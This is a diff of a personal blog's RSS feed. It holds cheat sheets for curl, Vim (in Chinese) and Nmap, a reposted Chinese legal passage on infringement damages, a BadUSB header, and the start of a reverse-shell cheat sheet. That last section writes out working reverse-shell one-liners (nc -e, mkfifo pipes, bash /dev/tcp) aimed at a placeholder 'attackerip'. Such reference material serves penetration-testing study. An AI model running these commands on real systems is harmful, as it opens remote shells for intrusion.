+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/*
 &lt;/span>&lt;span style="color:#75715e"> * Generated with &amp;lt;3 by Dckuino.js, an open source project !
 &lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
 &lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;avr/pgmspace.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
@@ -563,7 +533,7 @@ digiEnd();
 &lt;!--
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
 嵌入 BiliBili 视频 --></description></item><item><title>Curl Cheat Sheet</title><link>https://hare.one/cheatsheet/curl-cheat-sheet/</link><pubDate>Fri, 17 Jul 2020 16:30:13 +0800</pubDate><guid>https://hare.one/cheatsheet/curl-cheat-sheet/</guid><description>&lt;h3 id="options">Options&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
 curl -u user:pass &lt;span style="color:#75715e"># --user: Authentication&lt;/span>
 curl -v &lt;span style="color:#75715e"># --verbose&lt;/span>
 curl -vv &lt;span style="color:#75715e"># Even more verbose&lt;/span>
@@ -571,24 +541,24 @@ curl -s &lt;span style="color:#75715e"># --silent&lt;/span>
 curl -i &lt;span style="color:#75715e"># --include: Include the HTTP-header in the output&lt;/span>
 curl -I &lt;span style="color:#75715e"># --head: headers only&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="request">Request&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST &lt;span style="color:#75715e"># --request&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST &lt;span style="color:#75715e"># --request&lt;/span>
 curl -L &lt;span style="color:#75715e"># follow link if page redirects&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="data">Data&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -d &lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span> &lt;span style="color:#75715e"># --data: HTTP post data, URL encoded (eg, status=&amp;#34;Hello&amp;#34;)&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -d &lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span> &lt;span style="color:#75715e"># --data: HTTP post data, URL encoded (eg, status=&amp;#34;Hello&amp;#34;)&lt;/span>
 curl -d @file &lt;span style="color:#75715e"># --data via file&lt;/span>
 curl -G &lt;span style="color:#75715e"># --get: send -d data via get&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="headers">Headers&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -A &amp;lt;str&amp;gt; &lt;span style="color:#75715e"># --user-agent&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -A &amp;lt;str&amp;gt; &lt;span style="color:#75715e"># --user-agent&lt;/span>
 curl -b name&lt;span style="color:#f92672">=&lt;/span>val &lt;span style="color:#75715e"># --cookie&lt;/span>
 curl -b FILE &lt;span style="color:#75715e"># --cookie&lt;/span>
 curl -H &lt;span style="color:#e6db74">&amp;#34;X-Foo: y&amp;#34;&lt;/span> &lt;span style="color:#75715e"># --header&lt;/span>
 curl --compressed &lt;span style="color:#75715e"># use deflate/gzip&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ssl">SSL&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl --cacert &amp;lt;file&amp;gt; --capath &amp;lt;dir&amp;gt;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl --cacert &amp;lt;file&amp;gt; --capath &amp;lt;dir&amp;gt;
 curl -E, --cert &amp;lt;cert&amp;gt; &lt;span style="color:#75715e"># --cert: Client cert file --cert-type # der/pem/eng&lt;/span>
 curl -k, --insecure &lt;span style="color:#75715e"># for self-signed certs&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="examples">Examples&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># Post data:&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># Post data:&lt;/span>
 curl -d password&lt;span style="color:#f92672">=&lt;/span>x http://x.com/y
 &lt;span style="color:#75715e"># Auth/data:&lt;/span>
 curl -u user:pass -d status&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Hello&amp;#34;&lt;/span> http://twitter.com/statuses/update.xml
@@ -643,13 +613,13 @@ curl -o /dev/null --silent -Iw &lt;span style="color:#e6db74">&amp;#34;%{http_co
 &lt;p>第十八条 被侵权人为制止侵权行为所支付的合理开支，可以认定为侵权责任法第二十条规定的财产损失。合理开支包括被侵权人或者委托代理人对侵权行为进行调查、取证的合理费用。人民法院根据当事人的请求和具体案情，可以将符合国家有关部门规定的律师费用计算在赔偿范围内。&lt;/p>
 &lt;p>被侵权人因人身权益受侵害造成的财产损失或者侵权人因此获得的利益无法确定的，人民法院可以根据具体案情在 50 万元以下的范围内确定赔偿数额。&lt;/p>
 &lt;p>转载自：&lt;a href="https://m.weibo.cn/detail/4526016293356439">原文地址&lt;/a> 作者：不太老&lt;/p></description></item><item><title>Vim Cheat Sheet</title><link>https://hare.one/cheatsheet/vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare.one/cheatsheet/vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:h[elp] 关键字 - 打开关键字帮助
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:h[elp] 关键字 - 打开关键字帮助
 :sav[eas] 文件名 - 另存为
 :clo[se] - 关闭当前窗口
 :ter[minal] - open a terminal window
 K - 打开光标所在单词的man页面
 &lt;/code>&lt;/pre>&lt;h3 id="移动光标">移动光标&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">h - 左移光标
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">h - 左移光标
 j - 下移光标
 k - 上移光标
 l - 右移光标
@@ -686,7 +656,7 @@ Ctrl + f - 向下滚动一屏
 Ctrl + d - 向下滚动半屏
 Ctrl + u - 向上滚动半屏
 &lt;/code>&lt;/pre>&lt;h3 id="插入模式---插入追加文本">插入模式 - 插入/追加文本&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">i - 从光标前开始插入字符
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">i - 从光标前开始插入字符
 I - 从行首开始插入字符
 a - 从光标后开始插入字符
 A - 从行尾开始插入字符
@@ -702,7 +672,7 @@ Ctrl + n - 在插入模式下，用下一个匹配自动补全
 Ctrl + p - 在插入模式下，用上一个匹配自动补全
 Esc - 退出插入模式
 &lt;/code>&lt;/pre>&lt;h3 id="编辑文本">编辑文本&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">r - 替换当前字符
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">r - 替换当前字符
 J - 将下一行合并到当前行, 并在两部分文本之间插入一个空格
 gJ - 将下一行合并到当前行, 两部分文本之间不含空格
 gwip - 重新调整段落
@@ -722,7 +692,7 @@ U - 撤销本当前行的上次操作
 Ctrl + r - 重复
 . - 再次执行上个命令
 &lt;/code>&lt;/pre>&lt;h3 id="选择文本可视化模式">选择文本（可视化模式）&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">v - 进入可视化模式, 移动光标高亮选择, 然后可以对选择的文本执行命令(比如y-复制)
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">v - 进入可视化模式, 移动光标高亮选择, 然后可以对选择的文本执行命令(比如y-复制)
 V - 进入可视化模式(行粒度选择)
 o - 切换光标到选择区开头/结尾
 Ctrl + v - 进入可视化模式(矩阵选择)
@@ -736,7 +706,7 @@ iB - 选择被 {} 包裹的区域(不含花括号)
 it - 选择被 &amp;lt;&amp;gt; 包裹的区域(不含尖括号)
 Esc - 退出可视化模式
 &lt;/code>&lt;/pre>&lt;h3 id="可视化模式命令">可视化模式命令&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">&amp;gt; - 向右缩进
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">&amp;gt; - 向右缩进
 &amp;lt; - 向左缩进
 y - 复制
 d - 剪切
@@ -744,14 +714,14 @@ d - 剪切
 u - 将选定区域切换为小写
 U - 将选定区域切换为大写
 &lt;/code>&lt;/pre>&lt;h3 id="寄存器">寄存器&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:reg[isters] - 显示寄存器内容
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:reg[isters] - 显示寄存器内容
 &amp;quot;xy - 复制内容到寄存器 x
 &amp;quot;xp - 粘贴寄存器 x 中的内容
 &amp;quot;+y - 复制内容到系统剪贴板寄存器
 &amp;quot;+p - 从系统剪贴板寄存器中粘贴
 Tip 寄存器被存储在 ~/.viminfo 中, 在下次重启vim时仍会加载
 &lt;/code>&lt;/pre>&lt;h3 id="标记">标记&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:marks - 标记列表
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:marks - 标记列表
 ma - 设置当前位置为标记 a
 `a - 跳转到标记 a 的位置
 y`a - 复制当前位置到标记 a 的内容
@@ -767,12 +737,12 @@ g, - 跳转到改动列表里面更新的位置
 g; - 跳转到改动列表里面更旧的位置
 Ctrl + ] - 跳转到光标所在位置的 tag
 &lt;/code>&lt;/pre>&lt;h3 id="宏">宏&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">qa - 录制宏 a
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">qa - 录制宏 a
 q - 停止录制宏
 @a - 执行宏 a
 @@ - 重新执行上次执行的宏
 &lt;/code>&lt;/pre>&lt;h3 id="剪切-复制-粘贴">剪切, 复制, 粘贴&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">yy - 复制当前行
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">yy - 复制当前行
 2yy - 复制 2 行
 yw - 复制当前单词
 y$ - 复制, 从光标位置到行末
@@ -785,7 +755,7 @@ D - 剪切, 从光标位置到行末
 d$ - 剪切, 从光标位置到行末 (同D)
 x - 剪切当前字符
 &lt;/code>&lt;/pre>&lt;h3 id="文本缩进">文本缩进&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">&amp;gt;&amp;gt; - 当前行增加shiftwidth宽度的缩进
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">&amp;gt;&amp;gt; - 当前行增加shiftwidth宽度的缩进
 &amp;lt;&amp;lt; - 当前行减少shiftwidth宽度的缩进
 &amp;gt;% - 增加缩进当前光标位置被 () 或 {} 包裹的代码块(包括 (){})
 &amp;gt;ib - 增加缩进被 () 包裹的代码块(不包括())
@@ -796,14 +766,14 @@ x - 剪切当前字符
 gg=G - 重新缩进全文
 ]p - 粘贴并调整缩进以匹配当前行
 &lt;/code>&lt;/pre>&lt;h3 id="退出">退出&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:w - 保存
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:w - 保存
 :w !sudo tee % - 使用 sudo 保存当前文件
 :wq or :x or ZZ - 保存并退出
 :q - 退出(修改未保存时警告)
 :q! or ZQ - 不保存强制退出
 :wqa - 保存所有标签页并全部退出
 &lt;/code>&lt;/pre>&lt;h3 id="查找替换">查找/替换&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">/pattern - 查找pattern
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">/pattern - 查找pattern
 ?pattern - 向上查找pattern
 \vpattern - pattern 中的非字母数字字符被视为正则表达式特殊字符 (不需转义字符)
 n - 查找下一个
@@ -812,12 +782,12 @@ N - 查找上一个
 :%s/old/new/gc - (逐个)替换
 :noh[lsearch] - 移除搜索结果的高亮显示
 &lt;/code>&lt;/pre>&lt;h3 id="多文件搜索">多文件搜索&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:vim[grep] /pattern/ {`{file}`} - 在多个文件中搜索 pattern
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:vim[grep] /pattern/ {`{file}`} - 在多个文件中搜索 pattern
 :cn[ext] - 移动至下一个
 :cp[revious] - 移动至上一个
 :cope[n] - 打开搜索结果列表
 &lt;/code>&lt;/pre>&lt;h3 id="多文件编辑">多文件编辑&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:e[dit] 文件名 - 新建缓冲区打开 filename
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:e[dit] 文件名 - 新建缓冲区打开 filename
 :bn[ext] or :bn - 切换到下个缓冲区
 :bp[revious] or :bp - 切换到上个缓冲区
 :bd[elete] - 关闭缓冲区
@@ -839,7 +809,7 @@ Ctrl + wl - 切换到左侧窗口
 Ctrl + wj - 切换到下侧窗口
 Ctrl + wk - 切换到上侧窗口
 &lt;/code>&lt;/pre>&lt;h3 id="标签">标签&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:tabnew or :tabnew {page.words.file} - 在新标签中打开文件
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:tabnew or :tabnew {page.words.file} - 在新标签中打开文件
 Ctrl + wT - 将窗口变成标签
 gt or :tabn[ext] - 切换到下一个标签
 gT or :tabp[revious] - 切换到上一个标签
@@ -849,7 +819,7 @@ gT or :tabp[revious] - 切换到上一个标签
 :tabo[nly] - 关闭其他标签
 :tabdo command - 在所有标签中执行命令 (例如 :tabdo q 关闭所有标签)
 &lt;/code>&lt;/pre>&lt;h3 id="diff">Diff&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">zf - 手动定义向上折叠
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">zf - 手动定义向上折叠
 zd - 删除光标下的折叠
 za - 切换光标下折叠状态
 zo - 打开光标下的折叠
@@ -865,7 +835,7 @@ dp or :diffpu[t] - 将当前差异点中的内容覆盖到另一文件中的对�
 :dif[fupdate] - 刷新比较结果的高亮和折叠
 :diffo[ff] - 为当前窗口关闭比较模式
 &lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare.one/cheatsheet/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare.one/cheatsheet/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
 nmap 192.168.1.1
 &lt;span style="color:#75715e">#Scan a host&lt;/span>
 nmap www.testhostname.com
@@ -876,7 +846,7 @@ nmap 192.168.1.0/24
 &lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
 nmap -iL list-of-ips.txt
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-selection">Nmap Port Selection&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single Port&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single Port&lt;/span>
 nmap -p &lt;span style="color:#ae81ff">22&lt;/span> 192.168.1.1
 &lt;span style="color:#75715e">#Scan a range of ports&lt;/span>
 nmap -p 1-100 192.168.1.1
@@ -885,7 +855,7 @@ nmap -F 192.168.1.1
 &lt;span style="color:#75715e">#Scan all 65535 ports&lt;/span>
 nmap -p- 192.168.1.1
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-scan-types">Nmap Port Scan types&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using TCP connect&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using TCP connect&lt;/span>
 nmap -sT 192.168.1.1
 &lt;span style="color:#75715e">#Scan using TCP SYN scan (default)&lt;/span>
 nmap -sS 192.168.1.1
@@ -894,7 +864,7 @@ nmap -sU -p 123,161,162 192.168.1.1
 &lt;span style="color:#75715e">#Scan selected ports - ignore discovery&lt;/span>
 nmap -Pn -F 192.168.1.1
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="service-and-os-detection">Service and OS Detection&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Detect OS and Services&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Detect OS and Services&lt;/span>
 nmap -A 192.168.1.1
 &lt;span style="color:#75715e">#Standard service detection&lt;/span>
 nmap -sV 192.168.1.1
@@ -903,7 +873,7 @@ nmap -sV --version-intensity &lt;span style="color:#ae81ff">5&lt;/span> 192.168.
 &lt;span style="color:#75715e">#Lighter banner grabbing detection&lt;/span>
 nmap -sV --version-intensity &lt;span style="color:#ae81ff">0&lt;/span> 192.168.1.1
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-output-formats">Nmap Output Formats&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Save default output to file&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Save default output to file&lt;/span>
 nmap -oN outputfile.txt 192.168.1.1
 &lt;span style="color:#75715e">#Save results as XML&lt;/span>
 nmap -oX outputfile.xml 192.168.1.1
@@ -912,7 +882,7 @@ nmap -oG outputfile.txt 192.168.1.1
 &lt;span style="color:#75715e">#Save in all formats&lt;/span>
 nmap -oA outputfile 192.168.1.1
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="digging-deeper-with-nse-scripts">Digging deeper with NSE Scripts&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using default safe scripts&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using default safe scripts&lt;/span>
 nmap -sV -sC 192.168.1.1
 &lt;span style="color:#75715e">#Get help for a script&lt;/span>
 nmap --script-help&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed
@@ -921,47 +891,47 @@ nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> –script&lt;span style
 &lt;span style="color:#75715e">#Scan with a set of scripts&lt;/span>
 nmap -sV --script&lt;span style="color:#f92672">=&lt;/span>smb* 192.168.1.1
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="a-scan-to-search-for-ddos-reflection-udp-services">A scan to search for DDOS reflection UDP services&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan for UDP DDOS reflectors&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan for UDP DDOS reflectors&lt;/span>
 nmap –sU –A –PN –n –pU:19,53,123,161 –script&lt;span style="color:#f92672">=&lt;/span>ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="http-service-information">HTTP Service Information&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Gather page titles from HTTP services&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Gather page titles from HTTP services&lt;/span>
 nmap --script&lt;span style="color:#f92672">=&lt;/span>http-title 192.168.1.0/24
 &lt;span style="color:#75715e">#Get HTTP headers of web services&lt;/span>
 nmap --script&lt;span style="color:#f92672">=&lt;/span>http-headers 192.168.1.0/24
 &lt;span style="color:#75715e">#Find web apps from known paths&lt;/span>
 nmap --script&lt;span style="color:#f92672">=&lt;/span>http-enum 192.168.1.0/24
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="detect-heartbleed-ssl-vulnerability">Detect Heartbleed SSL Vulnerability&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Heartbleed Testing&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Heartbleed Testing&lt;/span>
 nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> --script&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed 192.168.1.0/24
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ip-address-information">IP Address information&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Find Information about IP address&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Find Information about IP address&lt;/span>
 nmap --script&lt;span style="color:#f92672">=&lt;/span>asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24
 &lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> &amp;gt;/tmp/f
 nc attackerip 8888|/bin/sh|nc attackerip &lt;span style="color:#ae81ff">9999&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="bash-版本">Bash 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
 bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">2&lt;/span>
 exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5|&lt;span style="color:#66d9ef">while&lt;/span> read line;&lt;span style="color:#66d9ef">do&lt;/span> $line &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">5&lt;/span> 2&amp;gt;&amp;amp;1;&lt;span style="color:#66d9ef">done&lt;/span>
 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span>
 mknod backpipe p; nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe 2&amp;gt;backpipe
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="perl-版本">Perl 版本&lt;/h2>
